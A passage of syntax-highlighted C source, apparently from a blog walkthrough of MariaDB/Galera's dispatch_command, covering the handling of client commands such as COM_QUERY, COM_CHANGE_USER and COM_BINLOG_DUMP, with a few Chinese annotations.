(thd-&gt;wsrep_conflict_state== ABORTED)</span><br><span class="line">    &#123;</span><br><span class="line">      my_error(ER_LOCK_DEADLOCK, MYF(<span class="number">0</span>), <span class="string">"wsrep aborted transaction"</span>);</span><br><span class="line">      WSREP_DEBUG(<span class="string">"Deadlock error for: %s"</span>, thd-&gt;query());</span><br><span class="line">      mysql_mutex_unlock(&amp;thd-&gt;LOCK_wsrep_thd);</span><br><span class="line">      thd-&gt;killed               = NOT_KILLED;</span><br><span class="line">      thd-&gt;mysys_var-&gt;<span class="built_in">abort</span>     = <span class="number">0</span>;</span><br><span class="line">      thd-&gt;wsrep_conflict_state = NO_CONFLICT;</span><br><span class="line">      thd-&gt;wsrep_retry_counter  = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> dispatch_end;</span><br><span class="line">    &#125;</span><br><span class="line">    mysql_mutex_unlock(&amp;thd-&gt;LOCK_wsrep_thd);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* WITH_WSREP */</span>   <span class="comment">//wsrep结束</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ENABLED_PROFILING)</span></span><br><span class="line">  thd-&gt;profiling.start_new_query();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  MYSQL_COMMAND_START(thd-&gt;thread_id, command,</span><br><span class="line">                      &amp;thd-&gt;security_ctx-&gt;priv_user[<span class="number">0</span>],</span><br><span class="line">                      (<span class="keyword">char</span> *) thd-&gt;security_ctx-&gt;host_or_ip);</span><br><span class="line">  </span><br><span class="line">  DBUG_EXECUTE_IF(<span class="string">"crash_dispatch_command_before"</span>,</span><br><span class="line">                  &#123; DBUG_PRINT(<span class="string">"crash_dispatch_command_before"</span>, (<span class="string">"now"</span>));</span><br><span class="line">                    DBUG_ABORT(); &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Performance Schema Interface instrumentation, begin */</span></span><br><span class="line">  thd-&gt;m_statement_psi= MYSQL_REFINE_STATEMENT(thd-&gt;m_statement_psi,</span><br><span class="line">                                               com_statement_info[command].</span><br><span class="line">                                               m_key);</span><br><span class="line">  thd-&gt;set_command(command);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    Commands which always take a long time are logged into</span></span><br><span class="line"><span class="comment">    the slow log only if opt_log_slow_admin_statements is set.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  thd-&gt;enable_slow_log= thd-&gt;variables.sql_log_slow;</span><br><span class="line">  thd-&gt;query_plan_flags= QPLAN_INIT;</span><br><span class="line">  thd-&gt;lex-&gt;sql_command= SQLCOM_END; <span class="comment">/* to avoid confusing VIEW detectors */</span></span><br><span class="line">  thd-&gt;reset_kill_query();</span><br><span class="line"></span><br><span class="line">  DEBUG_SYNC(thd,<span class="string">"dispatch_command_before_set_time"</span>);</span><br><span class="line"></span><br><span class="line">  thd-&gt;set_time();</span><br><span class="line">  <span class="keyword">if</span> (!(server_command_flags[command] &amp; CF_SKIP_QUERY_ID))</span><br><span class="line">    thd-&gt;set_query_id(next_query_id());</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      ping, get statistics or similar stateless command.</span></span><br><span class="line"><span class="comment">      No reason to increase query id here.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    thd-&gt;set_query_id(get_query_id());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(server_command_flags[command] &amp; CF_SKIP_QUESTIONS))</span><br><span class="line">    statistic_increment(thd-&gt;status_var.questions, &amp;LOCK_status);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Copy data for user stats */</span></span><br><span class="line">  <span class="keyword">if</span> ((thd-&gt;userstat_running= opt_userstat_running))</span><br><span class="line">  &#123;</span><br><span class="line">    thd-&gt;start_cpu_time= my_getcputime();</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;thd-&gt;org_status_var, &amp;thd-&gt;status_var, <span class="keyword">sizeof</span>(thd-&gt;status_var));</span><br><span class="line">    thd-&gt;select_commands= thd-&gt;update_commands= thd-&gt;other_commands= <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">    Clear the set of flags that are expected to be cleared at the</span></span><br><span class="line"><span class="comment">    beginning of each command.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  thd-&gt;server_status&amp;= ~SERVER_STATUS_CLEAR_SET;</span><br><span class="line">  <span class="keyword">switch</span> (command) &#123;</span><br><span class="line">  <span class="keyword">case</span> COM_INIT_DB:</span><br><span class="line">  &#123;</span><br><span class="line">    LEX_STRING tmp;</span><br><span class="line">    status_var_increment(thd-&gt;status_var.com_stat[SQLCOM_CHANGE_DB]);</span><br><span class="line">    <span class="keyword">if</span> (thd-&gt;copy_with_error(system_charset_info, &amp;tmp,</span><br><span class="line">                             thd-&gt;charset(), packet, packet_length))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (!mysql_change_db(thd, &amp;tmp, FALSE))</span><br><span class="line">    &#123;</span><br><span class="line">      general_log_write(thd, command, thd-&gt;db, thd-&gt;db_length);</span><br><span class="line">      my_ok(thd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_REPLICATION</span></span><br><span class="line">  <span class="keyword">case</span> COM_REGISTER_SLAVE:</span><br><span class="line">  &#123;</span><br><span class="line">    status_var_increment(thd-&gt;status_var.com_register_slave);</span><br><span class="line">    <span class="keyword">if</span> (!register_slave(thd, (uchar*)packet, packet_length))</span><br><span class="line">      my_ok(thd);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">case</span> COM_CHANGE_USER:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> auth_rc;</span><br><span class="line">    status_var_increment(thd-&gt;status_var.com_other);</span><br><span class="line"></span><br><span class="line">    thd-&gt;change_user();</span><br><span class="line">    thd-&gt;clear_error();                         <span class="comment">// if errors from rollback</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* acl_authenticate() takes the data from net-&gt;read_pos */</span></span><br><span class="line">    net-&gt;read_pos= (uchar*)packet;</span><br><span class="line"></span><br><span class="line">    uint save_db_length= thd-&gt;db_length;</span><br><span class="line">    <span class="keyword">char</span> *save_db= thd-&gt;db;</span><br><span class="line">    USER_CONN *save_user_connect= thd-&gt;user_connect;</span><br><span class="line">    Security_context save_security_ctx= *thd-&gt;security_ctx;</span><br><span class="line">    CHARSET_INFO *save_character_set_client=</span><br><span class="line">      thd-&gt;variables.character_set_client;</span><br><span class="line">    CHARSET_INFO *save_collation_connection=</span><br><span class="line">      thd-&gt;variables.collation_connection;</span><br><span class="line">    CHARSET_INFO *save_character_set_results=</span><br><span class="line">      thd-&gt;variables.character_set_results;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Ensure we don't free security_ctx-&gt;user in case we have to revert */</span></span><br><span class="line">    thd-&gt;security_ctx-&gt;user= <span class="number">0</span>;</span><br><span class="line">    thd-&gt;user_connect= <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      to limit COM_CHANGE_USER ability to brute-force passwords,</span></span><br><span class="line"><span class="comment">      we only allow three unsuccessful COM_CHANGE_USER per connection.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (thd-&gt;failed_com_change_user &gt;= <span class="number">3</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      my_message(ER_UNKNOWN_COM_ERROR, ER_THD(thd,ER_UNKNOWN_COM_ERROR),</span><br><span class="line">                 MYF(<span class="number">0</span>));</span><br><span class="line">      auth_rc= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      auth_rc= acl_authenticate(thd, packet_length);</span><br><span class="line"></span><br><span class="line">    mysql_audit_notify_connection_change_user(thd);</span><br><span class="line">    <span class="keyword">if</span> (auth_rc)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Free user if allocated by acl_authenticate */</span></span><br><span class="line">      my_free(thd-&gt;security_ctx-&gt;user);</span><br><span class="line">      *thd-&gt;security_ctx= save_security_ctx;</span><br><span class="line">      <span class="keyword">if</span> (thd-&gt;user_connect)</span><br><span class="line">decrease_user_connections(thd-&gt;user_connect);</span><br><span class="line">      thd-&gt;user_connect= save_user_connect;</span><br><span class="line">      thd-&gt;reset_db(save_db, save_db_length);</span><br><span class="line">      thd-&gt;variables.character_set_client= save_character_set_client;</span><br><span class="line">      thd-&gt;variables.collation_connection= save_collation_connection;</span><br><span class="line">      thd-&gt;variables.character_set_results= save_character_set_results;</span><br><span class="line">      thd-&gt;update_charset();</span><br><span class="line">      thd-&gt;failed_com_change_user++;</span><br><span class="line">      my_sleep(<span class="number">1000000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">#ifndef NO_EMBEDDED_ACCESS_CHECKS</span><br><span class="line">      <span class="comment">/* we've authenticated new user */</span></span><br><span class="line">      <span class="keyword">if</span> (save_user_connect)</span><br><span class="line">decrease_user_connections(save_user_connect);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* NO_EMBEDDED_ACCESS_CHECKS */</span></span></span><br><span class="line">      my_free(save_db);</span><br><span class="line">      my_free(save_security_ctx.user);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">case</span> COM_STMT_EXECUTE:</span><br><span class="line">  &#123;</span><br><span class="line">    mysqld_stmt_execute(thd, packet, packet_length);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">case</span> COM_STMT_FETCH:</span><br><span class="line">  &#123;</span><br><span class="line">    mysqld_stmt_fetch(thd, packet, packet_length);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">case</span> COM_STMT_SEND_LONG_DATA:</span><br><span class="line">  &#123;</span><br><span class="line">    mysql_stmt_get_longdata(thd, packet, packet_length);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">case</span> COM_STMT_PREPARE:</span><br><span class="line">  &#123;</span><br><span class="line">    mysqld_stmt_prepare(thd, packet, packet_length);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">case</span> COM_STMT_CLOSE:</span><br><span class="line">  &#123;</span><br><span class="line">    mysqld_stmt_close(thd, packet);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">case</span> COM_STMT_RESET:</span><br><span class="line">  &#123;</span><br><span class="line">    mysqld_stmt_reset(thd, packet);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">case</span> COM_QUERY: <span class="comment">//查询语句</span></span><br><span class="line">  &#123;</span><br><span class="line">      </span><br><span class="line">    DBUG_ASSERT(thd-&gt;m_digest == <span class="literal">NULL</span>);</span><br><span class="line">    thd-&gt;m_digest= &amp; thd-&gt;m_digest_state;</span><br><span class="line">    thd-&gt;m_digest-&gt;reset(thd-&gt;m_token_array, max_digest_length);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (alloc_query(thd, packet, packet_length))</span><br><span class="line">      <span class="keyword">break</span>;<span class="comment">// fatal error is set</span></span><br><span class="line">    MYSQL_QUERY_START(thd-&gt;query(), thd-&gt;thread_id,</span><br><span class="line">                      (<span class="keyword">char</span> *) (thd-&gt;db ? thd-&gt;db : <span class="string">""</span>),</span><br><span class="line">                      &amp;thd-&gt;security_ctx-&gt;priv_user[<span class="number">0</span>],</span><br><span class="line">                      (<span class="keyword">char</span> *) thd-&gt;security_ctx-&gt;host_or_ip);</span><br><span class="line">    <span class="keyword">char</span> *packet_end= thd-&gt;query() + thd-&gt;query_length();</span><br><span class="line">    general_log_write(thd, command, thd-&gt;query(), thd-&gt;query_length());</span><br><span class="line">    DBUG_PRINT(<span class="string">"query"</span>,(<span class="string">"%-.4096s"</span>,thd-&gt;query()));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ENABLED_PROFILING)</span></span><br><span class="line">    thd-&gt;profiling.set_query_source(thd-&gt;query(), thd-&gt;query_length());</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    MYSQL_SET_STATEMENT_TEXT(thd-&gt;m_statement_psi, thd-&gt;query(),</span><br><span class="line">                             thd-&gt;query_length());</span><br><span class="line"></span><br><span class="line">    Parser_state parser_state;</span><br><span class="line">    <span class="keyword">if</span> (parser_state.init(thd, thd-&gt;query(), thd-&gt;query_length()))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WSREP_ON)</span><br><span class="line">      wsrep_mysql_parse(thd, thd-&gt;query(), thd-&gt;query_length(), &amp;parser_state);   <span class="comment">//wsrep_mysql_parse执行</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      mysql_parse(thd, thd-&gt;query(), thd-&gt;query_length(), &amp;parser_state); <span class="comment">//否则使用mysql_parse执行</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!thd-&gt;killed &amp;&amp; (parser_state.m_lip.found_semicolon != <span class="literal">NULL</span>) &amp;&amp;</span><br><span class="line">           ! thd-&gt;is_error())</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Multiple queries exist, execute them individually</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      <span class="keyword">char</span> *beginning_of_next_stmt= (<span class="keyword">char</span>*) parser_state.m_lip.found_semicolon;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WITH_ARIA_STORAGE_ENGINE</span></span><br><span class="line">    ha_maria::implicit_commit(thd, FALSE);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Finalize server status flags after executing a statement. */</span></span><br><span class="line">      thd-&gt;update_server_status();</span><br><span class="line">      thd-&gt;protocol-&gt;end_statement();</span><br><span class="line">      query_cache_end_of_result(thd);</span><br><span class="line"></span><br><span class="line">      mysql_audit_general(thd, MYSQL_AUDIT_GENERAL_STATUS,</span><br><span class="line">                          thd-&gt;get_stmt_da()-&gt;is_error()</span><br><span class="line">                            ? thd-&gt;get_stmt_da()-&gt;sql_errno()</span><br><span class="line">                            : <span class="number">0</span>,</span><br><span class="line">                          command_name[command].str);</span><br><span class="line"></span><br><span class="line">      ulong length= (ulong)(packet_end - beginning_of_next_stmt);</span><br><span class="line"></span><br><span class="line">      log_slow_statement(thd);</span><br><span class="line">      DBUG_ASSERT(!thd-&gt;apc_target.is_enabled());</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Remove garbage at start of query */</span></span><br><span class="line">      <span class="keyword">while</span> (length &gt; <span class="number">0</span> &amp;&amp; my_isspace(thd-&gt;charset(), *beginning_of_next_stmt))</span><br><span class="line">      &#123;</span><br><span class="line">        beginning_of_next_stmt++;</span><br><span class="line">        length--;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* PSI end */</span></span><br><span class="line">      MYSQL_END_STATEMENT(thd-&gt;m_statement_psi, thd-&gt;get_stmt_da());</span><br><span class="line">      thd-&gt;m_statement_psi= <span class="literal">NULL</span>;</span><br><span class="line">      thd-&gt;m_digest= <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* DTRACE end */</span></span><br><span class="line">      <span class="keyword">if</span> (MYSQL_QUERY_DONE_ENABLED())</span><br><span class="line">      &#123;</span><br><span class="line">        MYSQL_QUERY_DONE(thd-&gt;is_error());</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ENABLED_PROFILING)</span></span><br><span class="line">      thd-&gt;profiling.finish_current_query();</span><br><span class="line">      thd-&gt;profiling.start_new_query(<span class="string">"continuing"</span>);</span><br><span class="line">      thd-&gt;profiling.set_query_source(beginning_of_next_stmt, length);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* DTRACE begin */</span></span><br><span class="line">      MYSQL_QUERY_START(beginning_of_next_stmt, thd-&gt;thread_id,</span><br><span class="line">                        (<span class="keyword">char</span> *) (thd-&gt;db ? thd-&gt;db : <span class="string">""</span>),</span><br><span class="line">                        &amp;thd-&gt;security_ctx-&gt;priv_user[<span class="number">0</span>],</span><br><span class="line">                        (<span class="keyword">char</span> *) thd-&gt;security_ctx-&gt;host_or_ip);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* PSI begin */</span></span><br><span class="line">      thd-&gt;m_digest= &amp; thd-&gt;m_digest_state;</span><br><span class="line"></span><br><span class="line">      thd-&gt;m_statement_psi= MYSQL_START_STATEMENT(&amp;thd-&gt;m_statement_state,</span><br><span class="line">                                                  com_statement_info[command].m_key,</span><br><span class="line">                                                  thd-&gt;db, thd-&gt;db_length,</span><br><span class="line">                                                  thd-&gt;charset());</span><br><span class="line">      THD_STAGE_INFO(thd, stage_init);</span><br><span class="line">      MYSQL_SET_STATEMENT_TEXT(thd-&gt;m_statement_psi, beginning_of_next_stmt,</span><br><span class="line">                               length);</span><br><span class="line"></span><br><span class="line">      thd-&gt;set_query_and_id(beginning_of_next_stmt, length,</span><br><span class="line">                            thd-&gt;charset(), next_query_id());</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Count each statement from the client.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      statistic_increment(thd-&gt;status_var.questions, &amp;LOCK_status);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(!WSREP(thd))</span><br><span class="line">thd-&gt;set_time(); <span class="comment">/* Reset the query start time. */</span></span><br><span class="line"></span><br><span class="line">      parser_state.reset(beginning_of_next_stmt, length);</span><br><span class="line">      <span class="comment">/* <span class="doctag">TODO:</span> set thd-&gt;lex-&gt;sql_command to SQLCOM_END here */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (WSREP_ON)</span><br><span class="line">        wsrep_mysql_parse(thd, beginning_of_next_stmt, length, &amp;parser_state);   <span class="comment">//执行wsrep_mysql_parse</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        mysql_parse(thd, beginning_of_next_stmt, length, &amp;parser_state);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DBUG_PRINT(<span class="string">"info"</span>,(<span class="string">"query ready"</span>));</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">case</span> COM_FIELD_LIST:<span class="comment">// This isn't actually needed</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DONT_ALLOW_SHOW_COMMANDS</span></span><br><span class="line">    my_message(ER_NOT_ALLOWED_COMMAND, ER_THD(thd, ER_NOT_ALLOWED_COMMAND),</span><br><span class="line">               MYF(<span class="number">0</span>));<span class="comment">/* purecov: inspected */</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">char</span> *fields, *packet_end= packet + packet_length, *arg_end;</span><br><span class="line">    <span class="comment">/* Locked closure of all tables */</span></span><br><span class="line">    TABLE_LIST table_list;</span><br><span class="line">    LEX_STRING table_name;</span><br><span class="line">    LEX_STRING db;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      SHOW statements should not add the used tables to the list of tables</span></span><br><span class="line"><span class="comment">      used in a transaction.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    MDL_savepoint mdl_savepoint= thd-&gt;mdl_context.mdl_savepoint();</span><br><span class="line"></span><br><span class="line">    status_var_increment(thd-&gt;status_var.com_stat[SQLCOM_SHOW_FIELDS]);</span><br><span class="line">    <span class="keyword">if</span> (thd-&gt;copy_db_to(&amp;db.str, &amp;db.length))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      We have name + wildcard in packet, separated by endzero</span></span><br><span class="line"><span class="comment">      (The packet is guaranteed to end with an end zero)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    arg_end= strend(packet);</span><br><span class="line">    uint arg_length= arg_end - packet;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check given table name length. */</span></span><br><span class="line">    <span class="keyword">if</span> (packet_length - arg_length &gt; NAME_LEN + <span class="number">1</span> || arg_length &gt; SAFE_NAME_LEN)</span><br><span class="line">    &#123;</span><br><span class="line">      my_message(ER_UNKNOWN_COM_ERROR, ER_THD(thd, ER_UNKNOWN_COM_ERROR),</span><br><span class="line">                 MYF(<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    thd-&gt;convert_string(&amp;table_name, system_charset_info,</span><br><span class="line">packet, arg_length, thd-&gt;charset());</span><br><span class="line">    <span class="keyword">if</span> (check_table_name(table_name.str, table_name.length, FALSE))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* this is OK due to convert_string() null-terminating the string */</span></span><br><span class="line">      my_error(ER_WRONG_TABLE_NAME, MYF(<span class="number">0</span>), table_name.str);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    packet= arg_end + <span class="number">1</span>;</span><br><span class="line">    thd-&gt;reset_for_next_command();</span><br><span class="line">    lex_start(thd);</span><br><span class="line">    <span class="comment">/* Must be before we init the table list. */</span></span><br><span class="line">    <span class="keyword">if</span> (lower_case_table_names)</span><br><span class="line">    &#123;</span><br><span class="line">      table_name.length= my_casedn_str(files_charset_info, table_name.str);</span><br><span class="line">      db.length= my_casedn_str(files_charset_info, db.str);</span><br><span class="line">    &#125;</span><br><span class="line">    table_list.init_one_table(db.str, db.length, table_name.str,</span><br><span class="line">                              table_name.length, table_name.str, TL_READ);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Init TABLE_LIST members necessary when the undelrying</span></span><br><span class="line"><span class="comment">      table is view.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    table_list.select_lex= &amp;(thd-&gt;lex-&gt;select_lex);</span><br><span class="line">    thd-&gt;lex-&gt;</span><br><span class="line">      select_lex.table_list.link_in_list(&amp;table_list,</span><br><span class="line">                                         &amp;table_list.next_local);</span><br><span class="line">    thd-&gt;lex-&gt;add_to_query_tables(&amp;table_list);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_infoschema_db(table_list.db, table_list.db_length))</span><br><span class="line">    &#123;</span><br><span class="line">      ST_SCHEMA_TABLE *schema_table= find_schema_table(thd, table_list.alias);</span><br><span class="line">      <span class="keyword">if</span> (schema_table)</span><br><span class="line">        table_list.schema_table= schema_table;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint query_length= (uint) (packet_end - packet); <span class="comment">// Don't count end \0</span></span><br><span class="line">    <span class="keyword">if</span> (!(fields= (<span class="keyword">char</span> *) thd-&gt;memdup(packet, query_length + <span class="number">1</span>)))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    thd-&gt;set_query(fields, query_length);</span><br><span class="line">    general_log_print(thd, command, <span class="string">"%s %s"</span>, table_list.table_name, fields);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (open_temporary_tables(thd, &amp;table_list))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (check_table_access(thd, SELECT_ACL, &amp;table_list,</span><br><span class="line">                           TRUE, UINT_MAX, FALSE))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Turn on an optimization relevant if the underlying table</span></span><br><span class="line"><span class="comment">      is a view: do not fill derived tables.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    thd-&gt;lex-&gt;sql_command= SQLCOM_SHOW_FIELDS;</span><br><span class="line"></span><br><span class="line">    mysqld_list_fields(thd,&amp;table_list,fields);</span><br><span class="line">    thd-&gt;lex-&gt;unit.cleanup();</span><br><span class="line">    <span class="comment">/* No need to rollback statement transaction, it's not started. */</span></span><br><span class="line">    DBUG_ASSERT(thd-&gt;transaction.stmt.is_empty());</span><br><span class="line">    close_thread_tables(thd);</span><br><span class="line">    thd-&gt;mdl_context.rollback_to_savepoint(mdl_savepoint);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (thd-&gt;transaction_rollback_request)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Transaction rollback was requested since MDL deadlock was</span></span><br><span class="line"><span class="comment">        discovered while trying to open tables. Rollback transaction</span></span><br><span class="line"><span class="comment">        in all storage engines including binary log and release all</span></span><br><span class="line"><span class="comment">        locks.</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      trans_rollback_implicit(thd);</span><br><span class="line">      thd-&gt;mdl_context.release_transactional_locks();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    thd-&gt;cleanup_after_query();</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">case</span> COM_QUIT:</span><br><span class="line">    <span class="comment">/* We don't calculate statistics for this command */</span></span><br><span class="line">    general_log_print(thd, command, NullS);</span><br><span class="line">    net-&gt;error=<span class="number">0</span>;<span class="comment">// Don't give 'abort' message</span></span><br><span class="line">    thd-&gt;get_stmt_da()-&gt;disable_status();       <span class="comment">// Don't send anything back</span></span><br><span class="line">    error=TRUE;<span class="comment">// End server</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> EMBEDDED_LIBRARY</span></span><br><span class="line">  <span class="keyword">case</span> COM_BINLOG_DUMP:</span><br><span class="line">    &#123;</span><br><span class="line">      ulong pos;</span><br><span class="line">      ushort flags;</span><br><span class="line">      uint32 slave_server_id;</span><br><span class="line"></span><br><span class="line">      status_var_increment(thd-&gt;status_var.com_other);</span><br><span class="line"></span><br><span class="line">      thd-&gt;enable_slow_log&amp;= opt_log_slow_admin_statements;</span><br><span class="line">      thd-&gt;query_plan_flags|= QPLAN_ADMIN;</span><br><span class="line">      <span class="keyword">if</span> (check_global_access(thd, REPL_SLAVE_ACL))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* <span class="doctag">TODO:</span> The following has to be changed to an 8 byte integer */</span></span><br><span class="line">      pos = uint4korr(packet);</span><br><span class="line">      flags = uint2korr(packet + <span class="number">4</span>);</span><br><span class="line">      thd-&gt;variables.server_id=<span class="number">0</span>; <span class="comment">/* avoid suicide */</span></span><br><span class="line">      <span class="keyword">if</span> ((slave_server_id= uint4korr(packet+<span class="number">6</span>))) <span class="comment">// mysqlbinlog.server_id==0</span></span><br><span class="line">kill_zombie_dump_threads(slave_server_id);</span><br><span class="line">      thd-&gt;variables.server_id = slave_server_id;</span><br><span class="line"></span><br><span class="line">      general_log_print(thd, command, <span class="string">"Log: '%s'  Pos: %ld"</span>, packet+<span class="number">10</span>,</span><br><span class="line">                      (<span class="keyword">long</span>) pos);</span><br><span class="line">      mysql_binlog_send(thd, thd-&gt;strdup(packet + <span class="number">10</span>), (<span class="keyword">my_off_t</span>) pos, flags);</span><br><span class="line">      unregister_slave(thd,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">      <span class="comment">/*  fake COM_QUIT -- if we get here, the thread needs to terminate */</span></span><br><span class="line">      error = TRUE;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  <span class="keyword">case</span> COM_REFRESH:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> not_used;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Initialize thd-&gt;lex since it's used in many base functions, such as</span></span><br><span class="line"><span class="comment">      open_tables(). Otherwise, it remains unitialized and may cause crash</span></span><br><span class="line"><span class="comment">      during execution of COM_REFRESH.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    lex_start(thd);</span><br><span class="line">    </span><br><span class="line">    status_var_increment(thd-&gt;status_var.com_stat[SQLCOM_FLUSH]);</span><br><span class="line">    ulonglong options= (ulonglong) (uchar) packet[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> (trans_commit_implicit(thd))</span><br><span class="line">      <span 